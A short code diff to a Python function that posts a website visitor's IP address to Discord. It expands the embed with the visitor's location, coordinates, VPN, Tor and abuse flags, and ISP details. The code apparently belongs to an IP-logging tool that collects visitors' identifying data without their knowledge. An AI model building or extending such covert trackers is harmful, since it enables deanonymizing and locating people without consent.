@@ -39,15 +39,24 @@ def send_ip_to_discord(ip, data):
         embed = discord.Embed(title="New Visitor IP",
                               description=f"IP: `{ip}`",
                               colour=0x00ff00)
+    
         embed.add_field(name="Location", 
                         value=f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']} {data['flag']['emoji']}", 
                         inline=False)
+        
         embed.add_field(name="Security Info",
                         value=f"Is VPN: {data['security']['is_vpn']}\n"
                               f"Is Proxy: {data['security']['is_proxy']}\n"
                               f"Is Tor: {data['security']['is_tor']}\n"
-                              f"Is Mobile: {data['security']['is_mobile']}",
+                              f"Is Mobile: {data['security']['is_mobile']}\n"
+                              f"Is Abuse: {data['security']['is_abuse']}",
                         inline=False)
+        
+        embed.add_field(name="Service Provider",
+                        value=f"ISP: {data['company']['name']}\n"
+                              f"Domain: {data['company']['domain']}",
+                              inline=False)
+        
         embed.add_field(name="Coordinates",
                         value=f"Latitude: {data['location']['latitude']}\n"
                               f"Longitude: {data['location']['longitude']}",
